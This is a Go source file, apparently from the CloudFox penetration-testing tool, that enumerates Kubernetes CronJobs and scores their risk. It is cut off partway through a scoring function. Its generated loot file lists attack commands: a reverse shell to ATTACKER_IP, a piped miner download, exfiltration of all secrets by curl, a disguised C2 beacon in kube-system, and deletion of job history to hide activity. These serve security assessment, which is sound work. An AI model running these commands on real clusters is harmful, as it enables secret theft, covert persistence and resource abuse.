package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var CronJobsCmd = &cobra.Command{
	Use:     "cronjobs",
	Aliases: []string{"cj"},
	Short:   "List all cluster CronJobs",
	Long: `
List all cluster CronJobs:
  cloudfox kubernetes cronjobs`,
	Run: ListCronJobs,
}

type CronJobsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t CronJobsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t CronJobsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type CronJobFinding struct {
	Namespace             string
	Name                  string
	Schedule              string
	RiskLevel             string
	RiskScore             int
	SecurityIssues        []string
	Suspend               bool
	ConcurrencyPolicy     string
	BackdoorPatterns      []string
	ReverseShells         []string
	CryptoMiners          []string
	DataExfiltration      []string
	ContainerEscape       []string
	ScheduleAnalysis      string
	SuccessfulJobsHistory int32
	FailedJobsHistory     int32
	ServiceAccount        string
	Containers            []CronJobContainer
	ImageRegistry         string
	ImageTags             []string
	HostPID               bool
	HostIPC               bool
	HostNetwork           bool
	Privileged            bool
	Capabilities          []string
	HostPaths             []string
	Volumes               []CronJobVolume
	Labels                map[string]string
	Annotations           map[string]string
	InitContainers        int
	ImagePullSecrets      []string
	Secrets               []string
	ConfigMaps            []string
	Affinity              string
	Tolerations           []string
	CloudProvider         string
	CloudRole             string
	Commands              []string
	Args                  []string
	EnvVars               []string
	CreationTimestamp     string
}

type CronJobContainer struct {
	Name             string
	Image            string
	Tag              string
	Registry         string
	Command          string
	Args             string
	Privileged       bool
	Capabilities     []string
	RunAsUser        string
	AllowPrivEsc     string
	ReadOnlyRootFS   string
	ResourceLimits   string
	ResourceRequests string
	EnvVarCount      int
}

type CronJobVolume struct {
	Name       string
	VolumeType string
	Source     string
	MountPath  string
	ReadOnly   bool
}

func ListCronJobs(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithCancel()
	defer cancel()
	logger := internal.NewLogger()

	// Extract global flags
	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating cronjobs for %s", globals.ClusterName), globals.K8S_CRONJOBS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	cronJobs, err := clientset.BatchV1().CronJobs(shared.GetNamespaceOrAll()).List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "cronjobs", "", err, globals.K8S_CRONJOBS_MODULE_NAME, true)
		return
	}

	// Table 1: CronJobs Summary
	summaryHeaders := []string{
		"Namespace", "Name", "Labels", "Schedule", "Schedule Analysis",
		"Concurrency Policy", "Suspend", "Job History",
		"Service Account", "Init Containers", "Image Pull Secrets",
		"Secrets", "ConfigMaps",
		"Security Context", "Suspicious Patterns", "Cloud IAM",
		"Affinity", "Tolerations",
	}

	// Table 2: CronJob-Containers Detail
	containerHeaders := []string{
		"Namespace", "CronJob", "Container", "Privileged", "Capabilities",
		"RunAsUser", "AllowPrivEsc", "ReadOnlyRootFS", "Resource Limits",
		"Image", "Tag", "Registry",
	}

	// Table 3: CronJob-Volumes Detail
	volumeHeaders := []string{
		"Namespace", "CronJob", "Volume Name", "Type", "Source Path/Name", "Container Mount Path", "Read Only",
	}

	var summaryRows [][]string
	var containerRows [][]string
	var volumeRows [][]string
	var findings []CronJobFinding

	// Risk counters
	riskCounts := shared.NewRiskCounts()

	for _, cj := range cronJobs.Items {
		podSpec := cj.Spec.JobTemplate.Spec.Template.Spec

		// Get success/failed history limits with defaults
		successHistory := int32(3)
		failedHistory := int32(1)
		if cj.Spec.SuccessfulJobsHistoryLimit != nil {
			successHistory = *cj.Spec.SuccessfulJobsHistoryLimit
		}
		if cj.Spec.FailedJobsHistoryLimit != nil {
			failedHistory = *cj.Spec.FailedJobsHistoryLimit
		}

		suspend := false
		if cj.Spec.Suspend != nil {
			suspend = *cj.Spec.Suspend
		}

		// Run comprehensive security analysis
		finding := analyzeCronJobSecurity(
			ctx,
			clientset,
			cj.Namespace,
			cj.Name,
			cj.Spec.Schedule,
			suspend,
			string(cj.Spec.ConcurrencyPolicy),
			successHistory,
			failedHistory,
			podSpec,
			cj.Spec.JobTemplate.Spec.Template.Annotations,
		)

		findings = append(findings, finding)

		// Count risk levels
		riskCounts.Add(finding.RiskLevel)

		// Merge all suspicious patterns into one column
		suspiciousPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")

		// Merge job history
		jobHistoryStr := fmt.Sprintf("Success: %d, Failed: %d", finding.SuccessfulJobsHistory, finding.FailedJobsHistory)

		// Merge security context - only show pod-level settings that are enabled
		var secContextParts []string
		if finding.HostPID {
			secContextParts = append(secContextParts, "HostPID")
		}
		if finding.HostIPC {
			secContextParts = append(secContextParts, "HostIPC")
		}
		if finding.HostNetwork {
			secContextParts = append(secContextParts, "HostNetwork")
		}
		for _, hp := range finding.HostPaths {
			secContextParts = append(secContextParts, fmt.Sprintf("HostPath:%s", hp))
		}
		secContextStr := strings.Join(secContextParts, ", ")

		// Merge cloud provider and role
		var cloudIAMStr string
		if finding.CloudProvider != "" && finding.CloudRole != "" {
			cloudIAMStr = fmt.Sprintf("%s: %s", finding.CloudProvider, finding.CloudRole)
		}

		// Format labels for display
		var labelParts []string
		for k, v := range finding.Labels {
			labelParts = append(labelParts, fmt.Sprintf("%s=%s", k, v))
		}
		labelsStr := strings.Join(labelParts, ", ")

		// Format init containers count
		initContainersStr := ""
		if finding.InitContainers > 0 {
			initContainersStr = fmt.Sprintf("%d", finding.InitContainers)
		}

		// Format image pull secrets
		imagePullSecretsStr := strings.Join(finding.ImagePullSecrets, ", ")

		// Format secrets
		secretsStr := strings.Join(finding.Secrets, ", ")

		// Format configmaps
		configMapsStr := strings.Join(finding.ConfigMaps, ", ")

		// Format tolerations
		tolerationsStr := strings.Join(finding.Tolerations, ", ")

		// Table 1: Summary row
		summaryRow := []string{
			finding.Namespace,
			finding.Name,
			k8sinternal.NonEmpty(labelsStr),
			finding.Schedule,
			finding.ScheduleAnalysis,
			finding.ConcurrencyPolicy,
			fmt.Sprintf("%v", finding.Suspend),
			jobHistoryStr,
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(initContainersStr),
			k8sinternal.NonEmpty(imagePullSecretsStr),
			k8sinternal.NonEmpty(secretsStr),
			k8sinternal.NonEmpty(configMapsStr),
			k8sinternal.NonEmpty(secContextStr),
			k8sinternal.NonEmpty(suspiciousPatternsStr),
			k8sinternal.NonEmpty(cloudIAMStr),
			k8sinternal.NonEmpty(finding.Affinity),
			k8sinternal.NonEmpty(tolerationsStr),
		}
		summaryRows = append(summaryRows, summaryRow)

		// Table 2: Container rows (one per container)
		for _, container := range finding.Containers {
			// Format capabilities
			capsStr := strings.Join(container.Capabilities, ", ")

			containerRow := []string{
				finding.Namespace,
				finding.Name,
				container.Name,
				fmt.Sprintf("%v", container.Privileged),
				k8sinternal.NonEmpty(capsStr),
				container.RunAsUser,
				container.AllowPrivEsc,
				container.ReadOnlyRootFS,
				k8sinternal.NonEmpty(container.ResourceLimits),
				container.Image,
				container.Tag,
				container.Registry,
			}
			containerRows = append(containerRows, containerRow)
		}

		// Table 3: Volume rows (one per volume)
		for _, volume := range finding.Volumes {
			volumeRow := []string{
				finding.Namespace,
				finding.Name,
				volume.Name,
				volume.VolumeType,
				volume.Source,
				volume.MountPath,
				fmt.Sprintf("%v", volume.ReadOnly),
			}
			volumeRows = append(volumeRows, volumeRow)
		}
	}

	// Generate comprehensive loot files
	lootFiles := generateCronJobLoot(findings, globals.KubeContext)

	// Create all three tables
	summaryTable := internal.TableFile{Name: "CronJobs", Header: summaryHeaders, Body: summaryRows}
	containerTable := internal.TableFile{Name: "CronJob-Containers", Header: containerHeaders, Body: containerRows}
	volumeTable := internal.TableFile{Name: "CronJob-Volumes", Header: volumeHeaders, Body: volumeRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"CronJobs",
		globals.ClusterName,
		"results",
		CronJobsOutput{Table: []internal.TableFile{summaryTable, containerTable, volumeTable}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_CRONJOBS_MODULE_NAME)
		return
	}

	if len(summaryRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d cronjobs found", len(summaryRows)), globals.K8S_CRONJOBS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low), globals.K8S_CRONJOBS_MODULE_NAME)

		if riskCounts.Critical > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d CRITICAL risk cronjobs detected! Check CronJob-Suspicious loot file", riskCounts.Critical), globals.K8S_CRONJOBS_MODULE_NAME)
		}
		if riskCounts.High > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d HIGH risk cronjobs detected! Check CronJob-Suspicious loot file", riskCounts.High), globals.K8S_CRONJOBS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No cronjobs found, skipping output file creation", globals.K8S_CRONJOBS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_CRONJOBS_MODULE_NAME), globals.K8S_CRONJOBS_MODULE_NAME)
}

// --- local formatters ---
func formatAffinity(affinity *v1.Affinity) string {
	if affinity == nil {
		return ""
	}
	b, err := json.Marshal(affinity)
	if err != nil {
		return ""
	}
	return string(b)
}

func formatTolerations(tols []v1.Toleration) string {
	if len(tols) == 0 {
		return ""
	}
	b, err := json.Marshal(tols)
	if err != nil {
		return ""
	}
	return string(b)
}

// --- Security Analysis Functions ---

func analyzeSchedule(schedule string) (string, string) {
	// Returns (analysis string, risk level)
	// Cron format: minute hour day month weekday
	parts := strings.Fields(schedule)
	if len(parts) < 5 {
		return "Invalid schedule format", "UNKNOWN"
	}

	minute := parts[0]
	hour := parts[1]

	// CRITICAL: Every minute (crypto miner pattern)
	if schedule == "* * * * *" {
		return "Runs EVERY MINUTE - typical crypto miner behavior", shared.RiskCritical
	}

	// CRITICAL: Every 2-5 minutes
	if minute == "*/2" || minute == "*/3" || minute == "*/4" || minute == "*/5" {
		return fmt.Sprintf("Runs every %s minutes - very frequent execution", minute), shared.RiskHigh
	}

	// HIGH: Off-hours execution (2am - 5am) - backdoor/exfiltration pattern
	if hour == "2" || hour == "3" || hour == "4" {
		return fmt.Sprintf("Runs at %s:00 (off-hours) - potential backdoor or exfiltration", hour), shared.RiskHigh
	}

	// MEDIUM: Every 10-15 minutes
	if minute == "*/10" || minute == "*/15" {
		return "Runs every 10-15 minutes - frequent execution", shared.RiskMedium
	}

	// MEDIUM: Multiple times per hour
	if strings.Contains(minute, ",") && len(strings.Split(minute, ",")) >= 4 {
		return "Runs multiple times per hour", shared.RiskMedium
	}

	// LOW: Normal schedule
	return "Normal schedule pattern", shared.RiskLow
}

func analyzeCronJobSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	schedule string,
	suspend bool,
	concurrencyPolicy string,
	successHistory int32,
	failedHistory int32,
	podSpec v1.PodSpec,
	annotations map[string]string,
) CronJobFinding {

	finding := CronJobFinding{
		Namespace:             namespace,
		Name:                  name,
		Schedule:              schedule,
		Suspend:               suspend,
		ConcurrencyPolicy:     concurrencyPolicy,
		SuccessfulJobsHistory: successHistory,
		FailedJobsHistory:     failedHistory,
		ServiceAccount:        podSpec.ServiceAccountName,
		HostPID:               podSpec.HostPID,
		HostIPC:               podSpec.HostIPC,
		HostNetwork:           podSpec.HostNetwork,
		Labels:                annotations, // Using annotations as labels for now
		Annotations:           annotations,
		InitContainers:        len(podSpec.InitContainers),
	}

	// Image Pull Secrets
	for _, ps := range podSpec.ImagePullSecrets {
		finding.ImagePullSecrets = append(finding.ImagePullSecrets, ps.Name)
	}

	// Affinity
	if podSpec.Affinity != nil {
		finding.Affinity = k8sinternal.PrettyPrintAffinity(podSpec.Affinity)
	}

	// Tolerations - full details
	for _, t := range podSpec.Tolerations {
		tolStr := ""
		if t.Key != "" {
			tolStr = t.Key
			if t.Value != "" {
				tolStr += "=" + t.Value
			}
		} else {
			tolStr = "*"
		}
		if t.Effect != "" {
			tolStr += ":" + string(t.Effect)
		}
		tolStr += fmt.Sprintf(" (%s)", t.Operator)
		if t.TolerationSeconds != nil {
			tolStr += fmt.Sprintf(" [%ds]", *t.TolerationSeconds)
		}
		finding.Tolerations = append(finding.Tolerations, tolStr)
	}

	// Extract containers, commands, args, images
	var containers []CronJobContainer
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	var capabilities []string
	privileged := false

	for _, c := range podSpec.Containers {
		// Parse image into components
		image := c.Image
		tag := "latest"
		registry := "docker.io"

		if strings.Contains(image, ":") {
			parts := strings.SplitN(image, ":", 2)
			image = parts[0]
			tag = parts[1]
		}
		if strings.Contains(image, "/") {
			parts := strings.Split(image, "/")
			if strings.Contains(parts[0], ".") || parts[0] == "localhost" {
				registry = parts[0]
			}
		}

		// Check for privileged and capabilities
		containerPrivileged := false
		var containerCaps []string
		containerRunAsUser := "-"
		containerAllowPrivEsc := "true" // default is true if not specified
		containerReadOnlyRootFS := "false"
		if c.SecurityContext != nil {
			if c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				containerPrivileged = true
				privileged = true
			}
			if c.SecurityContext.Capabilities != nil {
				for _, cap := range c.SecurityContext.Capabilities.Add {
					containerCaps = append(containerCaps, string(cap))
					capabilities = append(capabilities, string(cap))
				}
			}
			if c.SecurityContext.RunAsUser != nil {
				containerRunAsUser = fmt.Sprintf("%d", *c.SecurityContext.RunAsUser)
			}
			if c.SecurityContext.AllowPrivilegeEscalation != nil {
				containerAllowPrivEsc = fmt.Sprintf("%v", *c.SecurityContext.AllowPrivilegeEscalation)
			}
			if c.SecurityContext.ReadOnlyRootFilesystem != nil {
				containerReadOnlyRootFS = fmt.Sprintf("%v", *c.SecurityContext.ReadOnlyRootFilesystem)
			}
		}

		// Resource limits and requests
		var limitsStr, requestsStr string
		if c.Resources.Limits != nil {
			var limitParts []string
			if cpu, ok := c.Resources.Limits["cpu"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Limits["memory"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			limitsStr = strings.Join(limitParts, ", ")
		}
		if c.Resources.Requests != nil {
			var reqParts []string
			if cpu, ok := c.Resources.Requests["cpu"]; ok {
				reqParts = append(reqParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Requests["memory"]; ok {
				reqParts = append(reqParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			requestsStr = strings.Join(reqParts, ", ")
		}

		container := CronJobContainer{
			Name:             c.Name,
			Image:            c.Image,
			Tag:              tag,
			Registry:         registry,
			Command:          strings.Join(c.Command, " "),
			Args:             strings.Join(c.Args, " "),
			Privileged:       containerPrivileged,
			Capabilities:     containerCaps,
			RunAsUser:        containerRunAsUser,
			AllowPrivEsc:     containerAllowPrivEsc,
			ReadOnlyRootFS:   containerReadOnlyRootFS,
			ResourceLimits:   limitsStr,
			ResourceRequests: requestsStr,
			EnvVarCount:      len(c.Env),
		}
		containers = append(containers, container)

		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.Capabilities = capabilities
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		// Get registry from first image
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		// Extract tags
		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []CronJobVolume
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volume := CronJobVolume{
			Name: v.Name,
		}

		// Determine volume type and source
		if v.HostPath != nil {
			volume.VolumeType = "HostPath"
			volume.Source = v.HostPath.Path
			hostPaths = append(hostPaths, v.HostPath.Path)
		} else if v.Secret != nil {
			volume.VolumeType = "Secret"
			volume.Source = v.Secret.SecretName
			finding.Secrets = append(finding.Secrets, v.Secret.SecretName)
		} else if v.ConfigMap != nil {
			volume.VolumeType = "ConfigMap"
			volume.Source = v.ConfigMap.Name
			finding.ConfigMaps = append(finding.ConfigMaps, v.ConfigMap.Name)
		} else if v.EmptyDir != nil {
			volume.VolumeType = "EmptyDir"
			volume.Source = "-"
		} else if v.PersistentVolumeClaim != nil {
			volume.VolumeType = "PVC"
			volume.Source = v.PersistentVolumeClaim.ClaimName
		} else if v.Projected != nil {
			volume.VolumeType = "Projected"
			volume.Source = "-"
		} else if v.DownwardAPI != nil {
			volume.VolumeType = "DownwardAPI"
			volume.Source = "-"
		} else {
			volume.VolumeType = "Other"
			volume.Source = "-"
		}

		// Find mount path and read-only status
		for _, container := range podSpec.Containers {
			for _, vm := range container.VolumeMounts {
				if vm.Name == v.Name {
					volume.MountPath = vm.MountPath
					volume.ReadOnly = vm.ReadOnly
					break
				}
			}
		}

		volumes = append(volumes, volume)
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = shared.DetectReverseShells(allCommands, allArgs)
	finding.CryptoMiners = shared.DetectCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = shared.DetectDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = shared.DetectContainerEscape(allCommands, allArgs, hostPaths)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)

	// Schedule analysis
	scheduleAnalysis, scheduleRisk := analyzeSchedule(schedule)
	finding.ScheduleAnalysis = scheduleAnalysis

	// Calculate risk level
	finding.RiskLevel = calculateCronJobRiskLevel(finding, scheduleRisk)

	// Calculate risk score (0-100)
	finding.RiskScore = calculateCronJobRiskScore(finding, scheduleRisk)

	// Generate security issues
	finding.SecurityIssues = generateCronJobSecurityIssues(finding, scheduleRisk)

	return finding
}

func calculateCronJobRiskLevel(finding CronJobFinding, scheduleRisk string) string {
	// CRITICAL: Active backdoors, reverse shells, crypto miners
	if len(finding.ReverseShells) > 0 {
		return shared.RiskCritical
	}
	if len(finding.CryptoMiners) > 0 {
		return shared.RiskCritical
	}
	if len(finding.ContainerEscape) > 0 && (finding.HostPID || finding.HostIPC || finding.Privileged) {
		return shared.RiskCritical
	}
	if scheduleRisk == shared.RiskCritical && len(finding.BackdoorPatterns) > 0 {
		return shared.RiskCritical
	}

	// HIGH: Data exfiltration, container escape vectors, privileged + hostPath, dangerous capabilities
	if len(finding.DataExfiltration) > 0 {
		return shared.RiskHigh
	}
	if len(finding.ContainerEscape) > 0 {
		return shared.RiskHigh
	}
	if finding.Privileged && len(finding.HostPaths) > 0 {
		return shared.RiskHigh
	}
	if finding.HostPID || finding.HostIPC {
		return shared.RiskHigh
	}
	// Dangerous capabilities
	for _, cap := range finding.Capabilities {
		if strings.Contains(cap, "SYS_ADMIN") || strings.Contains(cap, "SYS_MODULE") {
			return shared.RiskHigh
		}
	}
	if scheduleRisk == shared.RiskHigh {
		return shared.RiskHigh
	}

	// MEDIUM: HostNetwork, suspicious schedules, cloud roles
	if finding.HostNetwork {
		return shared.RiskMedium
	}
	if scheduleRisk == shared.RiskMedium {
		return shared.RiskMedium
	}
	if finding.CloudRole != "" && finding.CloudRole != "<NONE>" {
		return shared.RiskMedium
	}
	if finding.Privileged {
		return shared.RiskMedium
	}

	// LOW: Standard cronjob
	return shared.RiskLow
}

func generateCronJobLoot(findings []CronJobFinding, kubeContext string) []internal.LootFile {
	var lootContent []string
	var entrypointsContent []string

	// Separate findings by risk level
	var critical, high []CronJobFinding
	for _, f := range findings {
		switch f.RiskLevel {
		case shared.RiskCritical:
			critical = append(critical, f)
		case shared.RiskHigh:
			high = append(high, f)
		}
	}

	// Sort each group by namespace, then name
	sortFindings := func(findings []CronJobFinding) {
		sort.Slice(findings, func(i, j int) bool {
			if findings[i].Namespace != findings[j].Namespace {
				return findings[i].Namespace < findings[j].Namespace
			}
			return findings[i].Name < findings[j].Name
		})
	}
	sortFindings(critical)
	sortFindings(high)

	// ========================================
	// CronJob-Commands.txt - Consolidated commands
	// ========================================
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "##### CronJob Commands")
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "")

	if kubeContext != "" {
		lootContent = append(lootContent, fmt.Sprintf("kubectl config use-context %s", kubeContext))
		lootContent = append(lootContent, "")
	}

	// === ENUMERATION ===
	lootContent = append(lootContent, "=== ENUMERATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all cronjobs with their schedules")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,SCHEDULE:.spec.schedule,SUSPEND:.spec.suspend,ACTIVE:.status.active,LAST-SCHEDULE:.status.lastScheduleTime")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs running every minute (crypto miner pattern)")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.schedule == \"* * * * *\") | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with privileged containers")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with hostPID/hostIPC/hostNetwork")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.hostPID == true or .spec.jobTemplate.spec.template.spec.hostIPC == true or .spec.jobTemplate.spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find cronjobs with hostPath volumes")
	lootContent = append(lootContent, "kubectl get cronjobs -A -o json | jq -r '.items[] | select(.spec.jobTemplate.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all jobs created by cronjobs")
	lootContent = append(lootContent, "kubectl get jobs -A --show-labels")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List failed jobs")
	lootContent = append(lootContent, "kubectl get jobs -A --field-selector status.successful!=1")
	lootContent = append(lootContent, "")

	// === HIGH RISK ===
	if len(critical) > 0 || len(high) > 0 {
		lootContent = append(lootContent, "=== HIGH RISK ===")
		lootContent = append(lootContent, "")

		for _, f := range critical {
			lootContent = append(lootContent, fmt.Sprintf("# [CRITICAL] %s/%s - Score: %d", f.Namespace, f.Name, f.RiskScore))
			lootContent = append(lootContent, fmt.Sprintf("kubectl get cronjob %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe cronjob %s -n %s", f.Name, f.Namespace))
			if len(f.SecurityIssues) > 0 {
				for _, issue := range f.SecurityIssues {
					lootContent = append(lootContent, fmt.Sprintf("#   - %s", issue))
				}
			}
			lootContent = append(lootContent, "")
		}

		for _, f := range high {
			lootContent = append(lootContent, fmt.Sprintf("# [HIGH] %s/%s - Score: %d", f.Namespace, f.Name, f.RiskScore))
			lootContent = append(lootContent, fmt.Sprintf("kubectl get cronjob %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe cronjob %s -n %s", f.Name, f.Namespace))
			lootContent = append(lootContent, "")
		}
	}

	// === EXPLOITATION ===
	lootContent = append(lootContent, "=== EXPLOITATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Modify existing cronjob to add reverse shell")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"jobTemplate\":{\"spec\":{\"template\":{\"spec\":{\"containers\":[{\"name\":\"<container>\",\"command\":[\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"]}]}}}}}}'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Deploy crypto miner cronjob")
	lootContent = append(lootContent, "kubectl create cronjob miner --image=alpine --schedule=\"* * * * *\" -- sh -c 'wget -O - http://POOL/miner.sh | sh'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Exfiltrate secrets via cronjob")
	lootContent = append(lootContent, "kubectl create cronjob exfil --image=alpine --schedule=\"0 3 * * *\" -- sh -c 'kubectl get secrets -A -o json | curl -X POST -d @- http://ATTACKER_IP/secrets'")
	lootContent = append(lootContent, "")

	// === PERSISTENCE ===
	lootContent = append(lootContent, "=== PERSISTENCE ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Use suspended cronjob as dormant backdoor")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"suspend\":true}}'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Hide in system namespaces with innocuous names")
	lootContent = append(lootContent, "kubectl create cronjob kube-system-check -n kube-system --image=alpine --schedule=\"0 4 * * *\" -- sh -c 'curl http://c2/beacon'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Delete completed jobs to hide activity")
	lootContent = append(lootContent, "kubectl delete jobs -n <namespace> --field-selector status.successful=1")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Disable job history retention")
	lootContent = append(lootContent, "kubectl patch cronjob <name> -n <namespace> -p '{\"spec\":{\"successfulJobsHistoryLimit\":0,\"failedJobsHistoryLimit\":0}}'")
	lootContent = append(lootContent, "")

	// ========================================
	// CronJob-Entrypoints.txt - Container startup commands
	// ========================================
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "##### CronJob Container Entrypoints")
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "# Only containers with commands or args are shown")
	entrypointsContent = append(entrypointsContent, "")

	// Sort all findings by namespace/name for consistent output
	allFindings := make([]CronJobFinding, len(findings))
	copy(allFindings, findings)
	sortFindings(allFindings)

	for _, f := range allFindings {
		var containerEntries []string
		for _, c := range f.Containers {
			// Only include containers with non-empty command or args
			if c.Command != "" || c.Args != "" {
				containerEntries = append(containerEntries, fmt.Sprintf("Container: %s", c.Name))
				containerEntries = append(containerEntries, fmt.Sprintf("  Image: %s", c.Image))
				if c.Command != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Command: %s", c.Command))
				}
				if c.Args != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Args: %s", c.Args))
				}
				containerEntries = append(containerEntries, "")
			}
		}

		// Only add workload section if it has containers with commands/args
		if len(containerEntries) > 0 {
			entrypointsContent = append(entrypointsContent, fmt.Sprintf("=== %s/%s ===", f.Namespace, f.Name))
			entrypointsContent = append(entrypointsContent, "")
			entrypointsContent = append(entrypointsContent, containerEntries...)
		}
	}

	return []internal.LootFile{
		{Name: "CronJob-Commands", Contents: strings.Join(lootContent, "\n")},
		{Name: "CronJob-Entrypoints", Contents: strings.Join(entrypointsContent, "\n")},
	}
}

// calculateCronJobRiskScore calculates a numeric risk score (0-100)
func calculateCronJobRiskScore(finding CronJobFinding, scheduleRisk string) int {
	score := 0

	// Backdoors and malicious activity (50 points max)
	if len(finding.ReverseShells) > 0 {
		score += 50
	}
	if len(finding.CryptoMiners) > 0 {
		score += 50
	}
	if len(finding.DataExfiltration) > 0 {
		score += 30
	}
	if len(finding.ContainerEscape) > 0 {
		score += 40
	}

	// Privileged access (25 points max)
	if finding.Privileged {
		score += 20
	}
	if finding.HostPID {
		score += 15
	}
	if finding.HostIPC {
		score += 10
	}
	if finding.HostNetwork {
